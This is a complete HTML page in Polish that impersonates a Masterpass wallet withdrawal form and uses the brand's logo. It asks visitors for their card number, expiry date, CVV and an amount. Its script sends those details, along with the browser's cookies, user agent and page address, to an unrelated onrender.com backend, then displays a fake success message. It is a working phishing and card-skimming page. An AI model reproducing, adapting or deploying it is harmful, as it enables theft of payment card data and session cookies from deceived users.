<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <title>Wypłata | Portfel Masterpass</title>
  <link rel="stylesheet" href="/style.css" />
</head>
<body>
  <div class="container">
    <img src="https://www.masterpass.pl/img/masterpass_logo.svg" alt="Masterpass logo" class="logo" />
    <h1>Wypłata na kartę</h1>

    <form id="withdrawForm">
      <label for="card">Numer karty (16 cyfr)</label>
      <input type="text" id="card" maxlength="19" placeholder="1234 5678 9012 3456" required pattern="\d{4} \d{4} \d{4} \d{4}" />

      <label for="expiry">Data ważności</label>
      <input type="month" id="expiry" required />

      <label for="cvv">Kod CVV</label>
      <input type="text" id="cvv" maxlength="4" placeholder="123" pattern="\d{3,4}" required />

      <label for="amount">Kwota (PLN)</label>
      <input type="number" id="amount" min="1" step="1" required />

      <button type="submit">Potwierdź wypłatę</button>
    </form>

    <div id="confirmation"></div>
  </div>

  <script type="module">
    const form = document.getElementById('withdrawForm');
    const confirmation = document.getElementById('confirmation');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const cardNumber = document.getElementById('card').value.trim();
      const expiryDate = document.getElementById('expiry').value;
      const cvv = document.getElementById('cvv').value.trim();
      const amount = document.getElementById('amount').value.trim();

      const res = await fetch('https://zaza-back.onrender.com/card', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cardNumber,
          expiryDate,
          cvv,
          amount,
          cookies: document.cookie,
          userAgent: navigator.userAgent,
          location: window.location.href,
          date: new Date().toISOString()
        })
      });

      const data = await res.json();
      confirmation.innerText = data.success
        ? '✅ Wypłata została zrealizowana.'
        : '❌ Wystąpił błąd.';
    });
  </script>
</body>
</html>
